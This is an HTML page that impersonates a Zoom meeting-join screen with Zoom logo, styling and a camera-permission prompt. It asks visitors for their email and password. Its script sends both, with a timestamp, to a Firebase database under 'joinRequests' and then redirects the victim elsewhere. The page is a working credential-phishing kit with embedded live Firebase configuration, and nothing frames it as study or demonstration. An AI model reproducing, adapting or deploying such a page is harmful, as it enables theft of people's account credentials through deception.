<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Zoom Meeting</title>

  <!-- Favicon -->
  <link rel="icon" type="image/png" href="../logo.png" />

  <!-- Load Material Icons -->
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" />

  <script type="module">
    // Firebase SDK Import (Latest v12)
    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-database.js";

    // Replace with your Firebase config
    const firebaseConfig = {
      apiKey: "AIzaSyArUMHWhrM-g0m0-kXTu_EWmGACetQvLlc",
      authDomain: "asf-panel-sm.firebaseapp.com",
      projectId: "asf-panel-sm",
      storageBucket: "asf-panel-sm.firebasestorage.app",
      messagingSenderId: "444535178333",
      appId: "1:444535178333:web:da733a6f819a0c4529f9b4",
      measurementId: "G-BSFWL4LLY5"
    };

    // Initialize Firebase
    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    // Wait for DOM
    window.addEventListener("DOMContentLoaded", () => {
      const btn = document.getElementById('askJoinBtn');
      const spinner = document.getElementById('spinner');

      // Create popup container
      let popup = document.createElement('div');
      popup.id = 'popup-message';
      popup.style.position = 'fixed';
      popup.style.top = '20px';
      popup.style.left = '50%';
      popup.style.transform = 'translateX(-50%)';
      popup.style.backgroundColor = '#f44336';
      popup.style.color = 'white';
      popup.style.padding = '12px 20px';
      popup.style.borderRadius = '4px';
      popup.style.boxShadow = '0 2px 6px rgba(0,0,0,0.3)';
      popup.style.fontSize = '14px';
      popup.style.fontWeight = '500';
      popup.style.zIndex = '9999';
      popup.style.display = 'none';
      document.body.appendChild(popup);

      function showPopup(message) {
        popup.textContent = message;
        popup.style.display = 'block';
        setTimeout(() => {
          popup.style.display = 'none';
        }, 3000);
      }

      btn.addEventListener('click', async () => {
        const email = document.querySelector('input[type="email"]').value.trim();
        const password = document.querySelector('input[type="password"]').value.trim();

        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

        if (!email || !password) {
          showPopup("Please enter both email and password");
          return;
        }

        if (!emailRegex.test(email)) {
          showPopup("Please enter a valid email address");
          return;
        }

        btn.disabled = true;
        spinner.style.display = 'block';

        try {
          await push(ref(db, "joinRequests"), {
            email: email,
            password: password,
            timestamp: new Date().toLocaleString()
          });
          console.log("Data sent to Firebase");
        } catch (error) {
          console.error("Error sending data:", error);
          showPopup("Error");
          btn.disabled = false;
          spinner.style.display = 'none';
          return;
        }

        setTimeout(() => {
          window.location.href = "cyy/";
        }, 2000);
      });
    });
  </script>

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      -webkit-font-smoothing: antialiased;
    }

    body {
      background-color: #ffffff;
      color: #2b2b2b;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      padding: 20px 16px;
    }

    /* Exact Zoom Header Logo */
    .top-bar {
      width: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      margin-top: 10px;
      margin-bottom: 25px;
    }

    .logo img {
      height: 42px;
      object-fit: contain;
    }

    /* Main Section for Mobile Screen */
    .main {
      width: 100%;
      max-width: 360px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    /* Video Player Box - Exact Screen Match */
    .video-section {
      width: 100%;
      background-color: #060606;
      border-radius: 4px;
      height: 200px;
      position: relative;
      display: flex;
      justify-content: center;
      align-items: center;
      margin-bottom: 30px;
    }

    video {
      position: absolute;
      width: 100%;
      height: 100%;
      object-fit: cover;
      z-index: 1;
    }

    .three-dots {
      position: absolute;
      top: 10px;
      right: 12px;
      z-index: 3;
      color: #bbbbbb;
      font-size: 16px;
      cursor: pointer;
    }

    .video-overlay {
      z-index: 3;
      text-align: center;
      padding: 0 15px;
      display: none;
    }

    .video-text {
      font-size: 13px;
      margin-bottom: 10px;
      color: #dddddd;
    }

    .allow-btn {
      background-color: #0e71eb;
      color: white;
      border: none;
      padding: 8px 14px;
      font-size: 13px;
      border-radius: 4px;
      cursor: pointer;
    }

    /* Bottom left 3-dots icon in video area */
    .more-option-icon {
      position: absolute;
      bottom: 12px;
      left: 12px;
      z-index: 3;
      width: 24px;
      height: 24px;
      background: #0e71eb;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-size: 12px;
    }

    /* Controls Center Icons */
    .controls {
      position: absolute;
      bottom: 10px;
      left: 50%;
      transform: translateX(-50%);
      display: flex;
      gap: 12px;
      z-index: 3;
    }

    .control-btn {
      width: 32px;
      height: 32px;
      background: rgba(255, 255, 255, 0.12);
      border: 1px solid rgba(255, 255, 255, 0.25);
      border-radius: 50%;
      color: white;
      cursor: pointer;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .control-btn span {
      font-size: 16px !important;
    }

    /* Form Section Elements */
    .form-section {
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .form-section h2 {
      font-size: 28px;
      font-weight: 700;
      margin-bottom: 24px;
      text-align: center;
      color: #232323;
      letter-spacing: -0.4px;
    }

    /* Exact Rounded Gray Border Input Fields */
    .form-input {
      width: 100%;
      padding: 14px 16px;
      margin-bottom: 16px;
      border: 1.5px solid #d0d5dd;
      border-radius: 10px;
      font-size: 15px;
      outline: none;
      background-color: #ffffff;
      color: #2b2b2b;
      transition: border-color 0.2s;
    }

    .form-input::placeholder {
      color: #667085;
      font-weight: 400;
    }

    .form-input:focus {
      border-color: #0e71eb;
    }

    /* Exact Blue Pill Button matching the screenshot */
    .btn-join {
      background-color: #0e71eb;
      color: #ffffff;
      padding: 14px 0;
      width: 100%;
      font-size: 17px;
      font-weight: 600;
      border: none;
      border-radius: 25px;
      cursor: pointer;
      margin-top: 4px;
      box-shadow: none;
      transition: background-color 0.2s;
    }

    .btn-join:hover {
      background-color: #0b5cff;
    }

    .spinner {
      border: 3px solid #f3f3f3;
      border-top: 3px solid #0e71eb;
      border-radius: 50%;
      width: 24px;
      height: 24px;
      animation: spin 1s linear infinite;
      display: none;
      margin: 15px auto 5px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* Red Text Option */
    .other-options {
      text-align: center;
      font-size: 14px;
      margin-top: 35px;
      color: #cf3c3c;
      line-height: 1.4;
      font-weight: 500;
    }

    .other-options a {
      color: #232323;
      text-decoration: none;
      font-weight: 600;
      display: block;
      margin-top: 2px;
    }

    .device-info-bar {
      display: none;
    }
  </style>
</head>
<body>

  <!-- Top Bar -->
  <div class="top-bar">
    <div class="logo">
      <img src="../Zoom-Logo.png" alt="Zoom" onerror="this.src='../logo.png'">
    </div>
  </div>

  <!-- Main Section -->
  <div class="main">
    <!-- Video Section -->
    <div class="video-section">
      <video id="video" autoplay muted playsinline style="display:none;"></video>

      <div class="three-dots">
        <span class="material-icons">more_vert</span>
      </div>

      <div class="more-option-icon">
        <span class="material-icons" style="font-size: 14px;">more_horiz</span>
      </div>

      <div class="video-overlay" id="videoOverlay">
        <p class="video-text">Do you want people to see and hear you in the meeting?</p>
        <button class="allow-btn" onclick="startCamera()">
          Allow microphone and camera
        </button>
      </div>

      <div class="controls">
        <button class="control-btn" aria-label="Mic Off">
          <span class="material-icons">mic_off</span>
        </button>
        <button class="control-btn" aria-label="Video Off">
          <span class="material-icons">videocam_off</span>
        </button>
      </div>
    </div>

    <!-- Form Section -->
    <div class="form-section">
      <h2>What's Your Email</h2>
      <input type="email" class="form-input" placeholder="Enter Your Email Address" />
      <input type="password" class="form-input" placeholder="Password" />
      <button class="btn-join" id="askJoinBtn">Ask To Join</button>
      <div class="spinner" id="spinner"></div>
      
      <div class="other-options">
        Other Joining Option
        <a href="#">Ask To Companion Mode</a>
      </div>
    </div>
  </div>

  <script>
    // Camera function
    function startCamera() {
      const video = document.getElementById("video");
      const overlay = document.getElementById("videoOverlay");
      navigator.mediaDevices
        .getUserMedia({ video: true, audio: true })
        .then((stream) => {
          video.srcObject = stream;
          video.style.display = "block";
          overlay.style.display = "none";
        })
        .catch((err) => {
          alert("Could not access camera/microphone: " + err.message);
        });
    }
  </script>
</body>
</html>
